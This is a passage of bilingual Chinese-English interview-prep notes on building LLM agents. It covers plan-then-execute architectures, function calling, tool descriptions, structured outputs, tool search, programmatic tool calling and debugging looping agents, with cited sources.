**来源：** [Self-Refine (arXiv 2303.17651)](https://arxiv.org/abs/2303.17651)、[Reflexion (arXiv 2303.11366)](https://arxiv.org/abs/2303.11366)、[Large Language Models Cannot Self-Correct Reasoning Yet (arXiv 2310.01798, ICLR 2024)](https://arxiv.org/abs/2310.01798)

---

### Q6 · ReWOO、LLMCompiler 这类"先规划后执行"的架构相比 ReAct 有什么优缺点？ <a id="q6"></a> [↑ 目录](#toc)

**English question:** What are the trade-offs of plan-then-execute architectures like ReWOO and LLMCompiler compared with ReAct?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3 控制面](06-ai-system-design.md#h19) 讲了静态规划（planning）和动态规划，以及"先走静态计划，偏离时才重规划（replanning）"的混合做法；[04 Agent 入门](notes/04-agent-basics.md) 第 4 节列了 plan-and-execute 的适用场景。本题补两篇论文的机制和数字。

**答案要点**
1. **ReAct 的两个成本问题**：一是串行（serial），每一步都要调一次模型。二是每次调用都要重发全部历史，输入 token 大致随步数平方增长（ReWOO 论文原话是 quadratically）。
2. **ReWOO**（Xu 等，2023）分三个模块：
   - Planner（规划器）：一次写完整个计划，每一步用 `#E1`、`#E2` 这样的证据变量引用前面步骤的结果。
   - Worker（执行者）：按计划调工具，把结果填进变量。
   - Solver（求解器）：根据计划和证据给出最终答案。
   - 数字：HotpotQA 上 token 效率约 5 倍，准确率 +4%；6 个基准（benchmark）平均 token 减少 64%，准确率 +4.4%。所有工具都返回"无证据"时，ReAct 在 HotpotQA 上掉 40.8 个点，ReWOO 掉 29.2 个点。
3. **LLMCompiler**（Kim 等，ICML 2024）：借鉴编译器，规划器输出一张任务依赖图（DAG），任务调度单元（Task Fetching Unit）把依赖已满足的任务分发给执行器（executor）并行执行。和 ReAct 相比，延迟最多降 3.7 倍，成本最多省 6.7 倍，准确率最多高约 9%。
4. **缺点**
   - 计划是在看到结果之前写的。如果工具结果出乎意料，ReWOO 没有重规划机制，论文也承认计划可能建立在错误的假设上。
   - 环境信息少的任务（如 ALFWorld）需要边看边走，事先规划要枚举很多可能，优势消失。
   - LLMCompiler 加了重规划，但实现复杂度和调试难度都更高。
5. **选择依据**：任务结构能事先看清、子任务相互独立（多实体（entity）对比、批量查询）时，用先规划后执行（plan-then-execute）加并行。下一步取决于上一步结果的探索型任务，用 ReAct。生产里常见的是混合：先走静态计划，某一步结果偏离预期才触发重规划。

**English answer (speakable, ~45–75 s):**
> ReAct pays for flexibility twice: it's serial, one model call per step, and it resends the whole history every time, so input tokens grow roughly quadratically. ReWOO plans once up front, with placeholders like E1 and E2 for evidence, lets workers fill them by calling tools, and a solver writes the answer — about 5x fewer tokens and 4 points better on HotpotQA. LLMCompiler goes further: the planner emits a dependency graph and independent calls run in parallel, up to 3.7x faster and 6.7x cheaper than ReAct in the paper. The cost is adaptivity. The plan is written before any results come back, so if a tool returns something surprising, a pure planner keeps executing a wrong plan, and in low-information environments you can't plan ahead at all. So I choose by dependency structure: parallel plan-then-execute for independent lookups like comparing five entities, ReAct for exploratory debugging, and in practice a hybrid — static plan, replan only when a step deviates from what the plan expected.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 怎么判断"偏离预期"并触发重规划？ | 计划的每一步写明预期结果。能用规则比对就用规则（比如状态应为 SHIPPED）；不能用规则才用评审模型打分。重规划次数要设上限。 | "Each plan step states its expected outcome. Compare with rules where possible, use a judge only where not, and cap the number of replans." |
| 这和 Q3 哪种模式最像？ | 静态 DAG 像并行分段，只不过子任务是模型规划出来的。动态重规划接近主管-工人。 | "A static DAG is parallelization whose sections the model planned; adding dynamic replanning moves it toward orchestrator-workers." |

**坑**
- 只说"更快更省"，不提计划在看到结果前就固定了这个根本限制。
- 把论文的"最多 3.7 倍"说成"平均 3.7 倍"。原文写的是 up to。
- 并行执行写操作。有依赖或有副作用（side effect）的步骤必须按顺序执行，而且要带幂等键。

**来源：** [ReWOO (arXiv 2305.18323)](https://arxiv.org/abs/2305.18323)、[ReWOO 全文 HTML](https://arxiv.org/html/2305.18323)、[An LLM Compiler for Parallel Function Calling (arXiv 2312.04511, ICML 2024)](https://arxiv.org/abs/2312.04511)

---

### Q7 · 你怎么看"模型越来越强，Agent 框架和 workflow 编排迟早会被淘汰"这个观点？ <a id="q7"></a> [↑ 目录](#toc)

**English question:** Some people say that as models get stronger, agent frameworks and workflow orchestration will become obsolete. What's your view?
（难度：开放 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.12 框架、手写循环、还是 Temporal](06-ai-system-design.md#s2-12) 讨论了框架和手写的取舍；[06 §2.3](06-ai-system-design.md#s2-3) 讲了"默认 workflow，只在需要处给自主度"。本题新补观点框架。

**答案要点**
1. **一部分会被淘汰：替模型思考的那部分。** 比如为弥补模型能力不足而写的复杂提示链、手工拆解步骤、教模型怎么推理的模板。Anthropic 2025-09 写道："更聪明的模型需要更少的规定式工程（prescriptive engineering），agent 可以更自主"。这和 Sutton《The Bitter Lesson》的观点一致：能利用算力的通用方法最终胜出。
2. **不会被淘汰的：和模型能力无关的系统工程。**
   - 持久化（persistence）和恢复：跑两小时的任务进程挂了，需要检查点（checkpoint）。
   - 权限和审批（approval）：写操作谁能做、要不要人工确认。
   - 预算和限流（rate limiting）：成本和下游 API 都有上限。
   - 审计（audit）和可观测性：合规要求说清"谁根据什么做了什么"。
   - 确定性（deterministic）业务规则：金额阈值（threshold）、合规判定，必须可复现（reproducible）。
   模型再强，也不会让"可审计（auditable）、可复现、有权限边界"这些需求消失。
3. **形态在变**：从"写死每一步的 DAG"变成"薄循环（thin loop）+ 好工具 + 上下文管理 + 护栏"。Anthropic 2024 年就建议先直接用 API，因为很多模式几行代码就能写完；而且框架的抽象层会遮住提示和响应，对底层的错误假设是客户常见的出错原因。
4. **我的判断标准**：每一层编排都问一句"它是在弥补模型能力，还是在承担系统责任？"前者每次换模型都重新评估，能删就删；后者保留，并加强。

**English answer (speakable, ~45–75 s):**
> I think it's half right. The part that's going away is orchestration that thinks on the model's behalf — elaborate prompt chains and hand-written step decompositions that compensate for weak reasoning. Anthropic said it directly last year: smarter models need less prescriptive engineering. That's the bitter lesson applied to agents. But a lot of orchestration has nothing to do with model capability. A two-hour task still needs checkpoints when the process dies. Writes still need permissions and approvals. Spend and downstream rate limits still need budgets. Regulated decisions still need an audit trail and deterministic rules. A smarter model doesn't remove any of that. So the shape changes — from rigid DAGs toward a thin loop with good tools, context management and guardrails — but the system responsibilities stay. My rule is to ask of every orchestration layer: is this compensating for the model, or carrying a system responsibility? The first kind I re-evaluate on every model upgrade and delete when the eval says I can.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 那你会选 LangGraph 这类框架吗？ | 需要持久化检查点、人工中断恢复、复杂分支时选它。简单循环自己写。无论用不用框架，都要能看到发给模型的原始提示和响应。 | "If I need durable checkpoints, human-in-the-loop resume and complex branching, yes; a simple loop I write myself. Either way I must see the raw prompts and responses." |
| 怎么证明某层编排可以删？ | 在同一评测集上对比删前和删后的成功率、成本、延迟，按切片（难度、类型）看有没有退化，再灰度上线。 | "A/B on the same eval set — success, cost, latency, broken down by slice — then a canary rollout." |

**坑**
- 一刀切地回答"会"或"不会"。好的回答要区分"弥补能力"和"系统责任"两类编排。
- 把框架等同于编排。持久化、权限、审计这些可以不用框架实现，但不能不做。

**来源：** [Anthropic — Effective context engineering for AI agents (2025-09-29)](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)、[Anthropic — Building effective agents (2024-12-19)](https://www.anthropic.com/engineering/building-effective-agents)、[Rich Sutton — The Bitter Lesson (2019)](http://www.incompleteideas.net/IncIdeas/BitterLesson.html)

---

## 模块 B：工具调用与 Function Calling <a id="mb"></a> [↑ 目录](#toc)

### Q8 · Function Calling 的完整流程是怎样的？模型真的"执行"了函数吗？ <a id="q8"></a> [↑ 目录](#toc)

**English question:** Walk me through the full function-calling flow. Does the model actually execute the function?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §0.3 第四步：工具调用](06-ai-system-design.md#h5) 用一个例子讲了从直接问模型到工具调用（tool call）；[06 §2.3 工具调用三种形态](06-ai-system-design.md#h18) 讲了单次、多轮（multi-turn）、并行（parallel）三种形态。本题补 API 层面的完整往返和"谁执行"。

**答案要点**
1. **模型不执行任何函数。** 它只生成一段结构化的"调用请求"（工具名 + JSON 参数）。真正执行的是你的应用代码；对于服务端（server-side）工具（server tools），执行的是厂商（vendor）的基础设施。
2. **完整流程（以 Anthropic API 为例）**
   - ① 请求里带上 `tools`：每个工具有名称、描述、`input_schema`（JSON Schema）。
   - ② 模型决定调用时，返回 `stop_reason: "tool_use"` 和一个或多个 `tool_use` 块，每块有 `id`、`name`、`input`。
   - ③ 代码校验（validation）参数、做权限（permission）检查、执行函数。
   - ④ 下一次请求把模型上一轮的输出原样放回 assistant 消息，再在 user 消息里放 `tool_result`，用 `tool_use_id` 配对；失败时可以标 `is_error`。
   - ⑤ 模型读到结果，继续调工具或给出最终回答。
3. **客户端（client）工具和服务端工具**：客户端工具（自定义函数、bash、文本编辑器）在你的应用里执行；服务端工具（web search、code execution、tool search）由厂商执行，结果直接出现在响应里。
4. **控制调用行为**：`tool_choice` 可以设为 `auto`（模型自己决定）、`any`（必须调某个工具）、`tool`（必须调指定工具）、`none`。`disable_parallel_tool_use` 限制每轮最多调一个。
5. **隐藏成本**：工具定义（tool definition）算输入 token。开启工具还会自动加一段系统提示（system prompt），例如 Claude Opus 4.5 在 `auto` 模式下是 496 tokens（按官方表）。
6. **安全含义**：因为执行权在代码手里，权限、参数校验（argument validation）、幂等（idempotency）、审批（approval）都应该放在执行层，不要指望模型"不会乱调"。

**English answer (speakable, ~45–75 s):**
> No — the model never executes anything. It emits a structured request: a tool name and JSON arguments. The flow is: I send the tool definitions — name, description, JSON schema — with the request. If the model wants a tool, the response stops with a tool-use reason and contains one or more tool-use blocks, each with an id, a name and the input. My code validates the arguments, checks permissions, and runs the function. Then I send the next request with the model's previous turn plus a tool result that carries the matching id, flagged as an error if it failed. The model reads it and either calls another tool or answers. Server-side tools like web search are the exception: the provider runs them for me. Because execution sits entirely in my code, that's where authorization, validation, idempotency and approvals live. The model proposes; my code decides whether to do it.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 模型缺少必填参数时会怎样？ | 可能会追问用户，也可能编一个合理的值。Anthropic 文档举的例子是没说地点时模型猜了 "New York"。所以要在代码里校验必填项和来源，或者在提示里要求缺信息时先问。 | "It may ask, or it may guess — the docs show a model inventing 'New York' for a missing location. So I validate required fields in code, or instruct it to ask when information is missing." |
| 为什么要用 id 配对？ | 并行调用时一轮可能有多个调用，按 id 配对才能让结果和调用一一对应，乱序回来也不会配错。 | "With parallel calls there are several per turn; ids keep each result matched to its call, even if they finish out of order." |

**坑**
- 说"模型调用了 API"。准确的说法是模型提出调用请求，由应用执行。这个区别决定了安全边界放在哪里。
- 忘了把模型上一轮的输出放回历史，只发了 `tool_result`。API 会报错，或者模型丢失上下文（context）。
- 忽略工具定义和系统提示的 token 成本。工具多了，这部分会非常大（见 Q11）。

**来源：** [Claude docs — Tool use overview（流程、tool_choice、系统提示 token 表）](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview)

---

### Q9 · 工具描述怎么写才能让模型选对、填对？你有没有量化过工具描述改动的效果？ <a id="q9"></a> [↑ 目录](#toc)

**English question:** How do you write tool descriptions so the model picks the right tool and fills the arguments correctly? Have you ever measured the effect of a description change?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 的"工具设计原则"表（7 条坏/好对比）来自你自己的 MCP 经验，包括一个工具对应一个业务问题、描述就是路由（routing）策略、错误分类等。本题补 Anthropic 官方方法论和"怎么量化"。

**答案要点**
1. **选对**
   - 工具少而精，每个对应一个高价值工作流（workflow）。例如用 `search_contacts` 而不是 `list_contacts`。
   - 用命名空间（namespace）前缀（prefix）分组，例如 `asana_search`、`asana_projects_search`。Anthropic 发现用前缀还是后缀会影响效果，而且不同模型不一样。
   - 描述里写清楚何时用、何时不用、和相似工具的边界。
2. **填对**
   - 参数名不留歧义，比如用 `user_id` 而不是 `user`。
   - 用枚举（enum）限定取值，写出格式示例。
   - 防呆设计（poka-yoke）：让参数很难填错。Anthropic 做 SWE-bench 时发现模型在相对路径上出错，改成强制绝对路径后问题消失。
   - 复杂参数可以给示例：Anthropic 的 Tool Use Examples（`input_examples` 字段）在内部测试中把复杂参数处理准确率从 72% 提到 90%。
3. **返回值也是"描述"的一部分**：返回高信号字段（名称，而不是 UUID）；提供 `response_format`（详细/简洁）选项，Anthropic 的例子里详细版 206 tokens、简洁版 72 tokens；错误信息要能指导下一步。Claude Code 默认把工具返回限制在 25,000 tokens。
4. **怎么量化**（Anthropic 的方法）：
   - 生成真实的多步任务，每个任务带可验证的结果。
   - 用简单的循环（loop）逐个跑。
   - 记录 5 个指标：总体准确率、工具调用和任务的运行时间、工具调用总次数、总 token 消耗、工具错误数。
   - 读模型的推理（reasoning）过程，找出它卡在哪，修改描述，再用留出集（held-out set）验证，防止过拟合（overfitting）。
5. **公开数据**：Anthropic 说精修工具描述（tool description）帮 Claude Sonnet 3.5 在 SWE-bench Verified 上达到当时最好成绩，但没有给出具体提升幅度。我不会编数字。

**English answer (speakable, ~45–75 s):**
> I treat tool descriptions as a model-facing API spec and write them like onboarding docs for a new hire. For picking the right tool: few, focused tools, namespaced by service, and every description says when to use it, when not to, and which sibling tool to use instead. For filling arguments: unambiguous names like user_id, enums wherever possible, examples for tricky formats, and poka-yoke — Anthropic found that requiring absolute file paths eliminated a whole class of errors. Responses matter too: return names instead of opaque ids, offer a concise mode, and make errors tell the model what to do next. For measuring, I follow the eval loop Anthropic describes: realistic multi-step tasks with verifiable outcomes, then track accuracy, number of tool calls, tokens, runtime and tool errors per variant, read the transcripts to see where it gets confused, and confirm on a held-out set. In my project, I tracked tool errors and wrong-tool selections on a fixed task set whenever I changed a description.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 两个工具总被混用怎么办？ | 先看是不是本该合并成一个。如果确实要分开，就在两个描述里互相写明边界（"查历史用 X，不要用本工具"），重命名让差别一眼可见，再用混淆用例做回归测试。 | "First ask whether they should be one tool. If not, state the boundary in both descriptions, rename so the difference is obvious, and add those confusable cases to the regression set." |
| 描述越长越好吗？ | 不是。描述是每次请求都要付的 token。写清边界和格式就够了，长例子放到 `input_examples`，或者配合按需加载（Q11）。 | "No — every word is paid on every request. State boundaries and formats; move long examples to input examples or on-demand loading." |

**坑**
- 只调描述不看返回值。很多选错、填错的根源是上一步返回值含糊。
- 只看最终准确率。调用次数和 token 也要看：准确率不变但调用次数减半，也是实实在在的改进。
- 引用"改描述提升了 X%"这类没有出处的数字。Anthropic 原文对 SWE-bench 没给具体幅度。

**来源：** [Anthropic — Writing effective tools for agents (2025-09-11)](https://www.anthropic.com/engineering/writing-tools-for-agents)、[Anthropic — Building effective agents, Appendix 2 (2024-12-19)](https://www.anthropic.com/engineering/building-effective-agents)、[Anthropic — Introducing advanced tool use (2025-11-24)](https://www.anthropic.com/engineering/advanced-tool-use)

---

### Q10 · 开了 JSON mode 或 Structured Outputs 之后，有人说模型推理变差了，为什么？怎么缓解？ <a id="q10"></a> [↑ 目录](#toc)

**English question:** After turning on JSON mode or Structured Outputs, some people say the model's reasoning got worse. Why would that happen, and how do you mitigate it?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.5](06-ai-system-design.md#s2-5) 讲了三种结构化做法、"格式合法不等于内容正确"，以及服务端两层校验的代码。本题新补"格式约束伤推理"的证据和缓解办法。

**答案要点**
1. **先分清两个概念**
   - JSON 模式（JSON mode）：只保证输出是合法 JSON，不保证符合 schema。OpenAI 文档的对比表写明 JSON mode 不保证遵守 schema。
   - 结构化输出（Structured Outputs）：用受约束解码（constrained decoding）保证符合 schema。原理是把 schema 编译成语法，生成每个 token 时只允许合法的 token。
2. **证据**：《Let Me Speak Freely?》（Tam 等，2024）发现，在格式限制下，推理任务的表现明显下降，而且约束越严格降得越多。分类任务有时反而受益，比如 DDXPlus 上 Gemini 1.5 Flash 开 JSON 模式后变好，因为输出空间变小了。
3. **为什么变差**
   - 字段顺序：如果 `answer` 字段排在 `reason` 前面，模型会先给答案再补理由，等于跳过了推理。论文里 GPT-3.5 Turbo 在 Last Letter 任务上，JSON 模式下所有回答都是 answer 在 reason 前面。
   - 没有思考空间：schema 里没有让模型写推理的字段，也没开思考模式，模型只能直接给结论。
   - 格式开销占用注意力（attention）：转义、嵌套结构、精确格式要求会分散模型的注意力。Anthropic 2024 年就建议避免格式开销（formatting overhead），格式要接近网上常见的文本。
4. **缓解**
   - 推理字段放在答案字段前面。OpenAI 文档说 Structured Outputs 会保持 schema 里的属性顺序，它的数学示例就是 `steps` 在 `final_answer` 之前。Claude 文档说明输出顺序是必填属性在前、可选属性在后，各自按 schema 顺序，所以推理字段要设成必填。
   - 推理和格式解耦：开扩展思考（extended thinking），或者先用自然语言回答，再用第二次调用转换成 JSON（论文里的 NL-to-Format）。
   - 放宽约束：只要求格式、不锁死复杂 schema；嵌套能平铺就平铺。
   - 在自己的评测集（eval set）上对比开和关两种方式，用数据决定，不靠感觉。
5. **别忘了约束解码（constrained decoding）的其他代价**：拒答（refusal）时输出可能不符合 schema；`max_tokens` 截断（truncation）时 JSON 不完整；首次编译语法有延迟（Claude 会缓存 24 小时）；部分 schema 特性不支持，例如 Claude 不支持数值范围约束（minimum/maximum）。

**English answer (speakable, ~45–75 s):**
> First I separate JSON mode, which only guarantees valid JSON, from Structured Outputs, which uses constrained decoding to guarantee the schema. The degradation is real: a 2024 study, "Let Me Speak Freely," found reasoning tasks got noticeably worse under format restrictions, and stricter constraints hurt more, while classification sometimes improved. The main mechanisms are simple. If the answer field comes before the reasoning field, the model commits to an answer first and rationalizes afterwards. If there's no room to think at all, it jumps to a conclusion. And heavy formatting pulls attention away from the problem. So I put a required reasoning field before the answer — providers keep schema property order — or I decouple: let the model think freely with extended thinking, or answer in prose and convert to JSON in a second call. I keep schemas flat, and I A/B both modes on my eval set. Then I still validate semantics, because valid JSON isn't a correct answer.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 推理字段会增加 token 和延迟，值得吗？ | 分类、抽取这类简单任务可以不要推理字段，直接用约束输出。多步推理任务需要它。按任务类型分别评测决定。 | "For simple classification or extraction I skip it; for multi-step reasoning I keep it. I decide per task type on the eval set." |
| Structured Outputs 保证 100% 正确吗？ | 只保证格式正确。拒答、截断仍然会出问题，内容（ID 是否存在、数值是否合理）也要服务端校验（06 §2.5）。 | "It guarantees shape, not truth. Refusals and truncation still break it, and content needs server-side semantic validation." |

**坑**
- 把 JSON mode 和 Structured Outputs 混为一谈。前者不保证 schema。
- 推理字段设成可选。Claude 的输出顺序是必填属性在前，可选的推理字段会被排到答案后面。
- 把这篇论文的结论当成定律。论文用的是 2024 年的模型；新模型配合思考模式受到的影响可能小很多（未核实），所以要在自己的任务上测。

**来源：** [Let Me Speak Freely? (arXiv 2408.02442)](https://arxiv.org/abs/2408.02442)、[论文全文 HTML](https://arxiv.org/html/2408.02442v3)、[OpenAI — Structured Outputs guide](https://developers.openai.com/api/docs/guides/structured-outputs)、[Claude docs — Structured outputs](https://platform.claude.com/docs/en/build-with-claude/structured-outputs)、[Anthropic — Building effective agents, Appendix 2](https://www.anthropic.com/engineering/building-effective-agents)

---

### Q11 · 你的 Agent 接了 80 个工具，光工具定义就占了 5 万多 token，怎么优化？ <a id="q11"></a> [↑ 目录](#toc)

**English question:** Your agent has 80 tools and the tool definitions alone take over 50K tokens. How do you fix that?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3 工具调用三种形态](06-ai-system-design.md#h18) 提到"工具多了要按需加载：tool registry + 按意图（intent）只挂相关工具"；[06 §2.8 ② 提示缓存](06-ai-system-design.md#h39) 讲了前缀缓存（cache）。本题补 Anthropic Tool Search Tool 的机制和官方数字。

**答案要点**
1. **问题有两个，不只是成本**
   - 上下文膨胀（context bloat）：Anthropic 的例子是 GitHub、Slack、Sentry、Grafana、Splunk 5 个 MCP 服务器共 58 个工具，对话还没开始就占约 55K tokens。其中 GitHub 35 个工具约 26K，Slack 11 个约 21K。
   - 选错工具：官方文档说，可用工具超过 30–50 个后，Claude 选对工具的能力会下降。
2. **工具搜索（Tool Search Tool，2025-11-24 发布）**
   - 所有工具定义照常发送，但标 `defer_loading: true` 的不进上下文。
   - 模型需要时调用搜索工具（`tool_search_tool_regex_20251119` 或 `..._bm25_20251119`），API 返回 `tool_reference`（默认最多 5 个），自动展开成完整定义。
   - 数字：token 消耗减少 85%，例子里从约 77K 降到约 8.7K。MCP 评测（evaluation, eval）准确率：Opus 4 从 49% 到 74%，Opus 4.5 从 79.5% 到 88.1%。
   - 最常用的 3–5 个工具不要延迟加载。每次请求最多 10,000 个延迟加载的工具。
   - 也可以自己实现搜索（比如用向量检索（vector search）），只要返回 `tool_reference` 即可。
3. **和提示缓存（prompt caching）的关系**：延迟加载的工具不进系统提示前缀，所以前缀不变，缓存不会失效。如果按请求动态增删工具列表，每次前缀都变，缓存全部失效。这也是工具搜索比"每轮重新挑工具"更好的原因之一。
4. **其他手段，可以组合使用**
   - 先合并工具：80 个里常有一个后端接口对应一个工具的情况，按业务问题合并、删掉重复的。
   - 路由分组：先按意图路由，再只挂这个场景的工具集（toolset）。比如 LangChain 有 `LLMToolSelectorMiddleware`，先用一个小模型（small model）挑工具。
   - 精简描述：删掉冗长的说明，长示例改用 `input_examples` 并跟着延迟加载一起展开。
   - 工具非常多、而且要做数据处理时，考虑代码执行（Q12）。
5. **先测量**：统计每个工具的定义 token 和实际调用频率。长尾工具（很少用、但定义很长）优先延迟加载。

**English answer (speakable, ~45–75 s):**
> There are two problems here, not one. It's cost and latency on every request, and it's accuracy — Anthropic's docs say tool selection degrades past roughly 30 to 50 tools. Their own example is five MCP servers, 58 tools, about 55K tokens before the conversation even starts. First I'd consolidate: 80 tools usually means one tool per backend endpoint, and I'd merge them into tools that answer business questions. Then on-demand loading: mark most tools as deferred so they aren't in context, keep the three to five most-used ones loaded, and give the model a search tool that pulls in definitions only when needed. Anthropic reported an 85% token reduction and MCP eval accuracy going from 79.5 to 88.1% on Opus 4.5. Deferred tools stay out of the cached prefix, so prompt caching still works — which is why I wouldn't rebuild the tool list per request. Before any of that, I'd measure per-tool definition size against call frequency and defer the long tail first.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 搜索找不到正确的工具怎么办？ | 描述里加上用户常用的说法作为关键词；统一命名前缀，一次搜索就能命中一组；在系统提示里列出工具类别；监控搜索命中情况，没命中的查询拿来改描述。 | "Add user-style keywords to descriptions, use consistent prefixes so one search hits the group, list tool categories in the system prompt, and mine failed searches to fix descriptions." |
| 工具搜索有什么代价？ | 多一次搜索往返，会增加延迟；搜索本身也可能选错。工具少于 10 个、或者每次都要用全部工具时，不值得用。 | "An extra round trip and a possible search miss. Under about 10 tools, or when every tool is used every time, it isn't worth it." |

**坑**
- 帖子说"58 个工具吃掉 5 万多 token"，和一手来源一致（原文约 55K）。但本题的"80 个工具"是题目设定的场景，不是官方数字。
- 只讲省 token，不讲准确率。工具太多会导致选错，这同样是问题，而且官方有数据。
- 按请求动态删减工具列表，导致提示缓存全部失效，省下的 token 又在缓存未命中上亏回去了。

**来源：** [Anthropic — Introducing advanced tool use (2025-11-24)](https://www.anthropic.com/engineering/advanced-tool-use)、[Claude docs — Tool search tool](https://platform.claude.com/docs/en/agents-and-tools/tool-use/tool-search-tool)、[LangChain docs — Built-in middleware](https://docs.langchain.com/oss/python/langchain/middleware/built-in)

---

### Q12 · 什么是 Programmatic Tool Calling / Code execution with MCP？它解决了什么问题，代价是什么？ <a id="q12"></a> [↑ 目录](#toc)

**English question:** What are Programmatic Tool Calling and code execution with MCP? What problem do they solve, and what do they cost?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。相关背景见 [06 §2.3 工具调用三种形态](06-ai-system-design.md#h18)（多轮调用累计 token 随步数平方增长）和 [06 §2.7 安全防护](06-ai-system-design.md#s2-7)。

**答案要点**
1. **传统工具调用的两个浪费**
   - 每调一次工具就要多一次模型推理。20 次调用 = 20 次往返。
   - 每个中间结果都要进上下文。比如读了 10,000 行日志（logs），即使只需要 5 行，模型也得全部"看一遍"。
2. **代码执行 + MCP（Anthropic，2025-11-04）**：把 MCP 服务器当成代码 API 暴露出来（比如文件系统里每个工具一个文件）。agent 浏览目录、按需读取工具定义，然后写代码调用。过滤、聚合、循环都在沙箱（sandbox）里完成，只把小结果返回给模型。文中的例子把 token 从 150,000 降到 2,000，节省 98.7%。注意这只是一个示例，不是基准测试（benchmark）。
3. **程序化工具调用（Programmatic Tool Calling, PTC，2025-11-24）**：Anthropic 的 API 功能。工具通过 `allowed_callers` 字段允许被代码执行工具（`code_execution_20250825`）调用。模型写一段 Python 代码，在代码里调用多个工具。数字：复杂研究任务平均 token 从 43,588 降到 27,297（减少 37%）；一段代码编排（orchestration） 20 多次调用，省掉 19 次以上的推理往返；内部知识检索（retrieval）准确率从 25.6% 到 28.5%，GIA 基准（benchmark，原文写法）从 46.5% 到 51.2%。
4. **其他好处**：控制流（control flow，循环、条件、错误处理）用代码表达，比让模型逐步决定更可靠；中间数据可以不进模型上下文，敏感字段可以先做令牌化（tokenize）处理，有利于隐私；可以把中间结果写到文件、保存可复用的函数，形成技能（skills）。
5. **代价**
   - 必须有安全的沙箱：执行的是模型生成的代码，要有资源限制和监控（monitoring）。Anthropic 原文明确说这带来运维开销和安全考量，直接调用工具没有这些问题。
   - 可观测性（observability）和审计（audit）变难：一段代码里调了十几个工具，要在代码执行层逐个记录调用。
   - 权限边界：代码里调用写工具（write tool）同样要经过鉴权（authorization）和审批，不能因为"在沙箱里"就绕过去。
   - 简单的单次查询不需要它，反而增加延迟和复杂度。
6. **什么时候用**：多步、数据量大、需要循环或聚合的任务（批量查询、日志分析、对比多个实体（entity））。单个简单查询仍然用直接工具调用。

**English answer (speakable, ~45–75 s):**
> Classic tool calling wastes two things: every call costs a full model round trip, and every intermediate result lands in the context, even if I only need five rows out of ten thousand. Code execution with MCP flips that. The MCP servers are exposed as a code API, the agent reads only the tool definitions it needs and writes code that calls them, and filtering, loops and aggregation happen in a sandbox, so only the small final result reaches the model. Anthropic's example went from 150,000 to 2,000 tokens. Programmatic Tool Calling is the API version: tools opt in to being called from the code-execution tool, and they reported 37% fewer tokens on complex research tasks and skipping 19-plus inference passes when one script orchestrates 20 calls. The cost is real, though: you're running model-written code, so you need a hardened sandbox with resource limits, per-call tracing inside the script, and the same authorization on write tools. For a single simple lookup, I'd still use a direct tool call.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 和 Tool Search 是什么关系？ | 互补。Tool Search 解决"定义太多"，PTC/代码执行解决"调用往返和中间结果太多"。两者都是把不需要的内容挡在上下文之外。 | "Complementary. Tool search fixes too many definitions; programmatic calling fixes too many round trips and bulky intermediate results. Both keep unneeded tokens out of context." |
| 沙箱要做到什么程度？ | 网络默认禁止或只开白名单；限制 CPU、内存和墙钟时间；不挂载凭证；工具调用经过一个代理，由代理做鉴权和审计。 | "Network denied by default or allowlisted, CPU, memory and wall-clock limits, no credentials mounted, and tool calls routed through a proxy that enforces auth and logs each call." |

**坑**
- 把 98.7% 当成普遍效果。它是单个示例；PTC 在基准上的数字是 37%。
- 忽略安全成本。执行模型生成的代码本身就是新的攻击面，提示注入（prompt injection）可能让模型写出恶意（malicious）代码。
- 把"GIA"自作主张改成 GAIA。原文就写的 GIA，没有展开说明（未核实是否就是 GAIA）。

**来源：** [Anthropic — Code execution with MCP (2025-11-04)](https://www.anthropic.com/engineering/code-execution-with-mcp)、[Anthropic — Introducing advanced tool use (2025-11-24)](https://www.anthropic.com/engineering/advanced-tool-use)

---

### Q13 · 线上 Agent 跑到第 30 步开始重复调用同一个工具、参数几乎不变，你怎么排查和修复？ <a id="q13"></a> [↑ 目录](#toc)

**English question:** In production, your agent starts calling the same tool with nearly identical arguments over and over once it passes step 30. How do you debug and fix it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.7 ⑤ 失控循环](06-ai-system-design.md#h36) 列了步数上限、重复调用去重（deduplication，工具名 + 参数哈希（hash）重复 2 次就停）；[06 §2.4 长时运行流水线为什么跑久了变笨](06-ai-system-design.md#h21) 讲了长上下文（long context）下效果退化和状态外化（state externalization）。本题按实战顺序组织。

**答案要点**
1. **止血（mitigation）**
   - 先上代码级的重复检测：对"工具名 + 规范化（normalization）参数"做哈希，规范化时去掉空白、排序键、去掉时间戳（timestamp）这类易变字段，所以"几乎不变"也能命中。
   - 重复第 2 次时不再真正执行，而是回一个结构化提示："你在第 12 步已经用相同参数调用过，结果是……请换个方法，或者结束并报告。"
   - 第 3 次就终止，返回部分结果并转人工（human handoff）。
   - 同时收紧步数上限和单工具调用配额。例如 LangChain 的 `ToolCallLimitMiddleware` 可以按工具设置 `run_limit`。
2. **定位**：拉出循环任务的完整 trace，看三件事。
   - 第 30 步时上下文有多大（token 数）。
   - 重复调用前后的工具返回值。
   - 第一次调用的结果还在不在上下文里。
   然后按任务类型、模型版本、上下文长度切片（slice），看是否集中在某一类。
3. **根因（root cause），按常见程度排序**
   - ① 工具返回值让模型以为没成功：空数组、含糊的错误、被截断却没标明，模型就"再试一次"。这是最常见的原因。
   - ② 上下文过长：上下文越满，模型的回忆越差，Anthropic 称为上下文腐烂（context rot）。原始目标和之前的结果被淹没了。
   - ③ 压缩（compaction）或上下文清理删掉了之前调用的记录，模型不记得已经调过。
   - ④ 没有明确的完成标准，模型不知道什么时候算"查够了"。
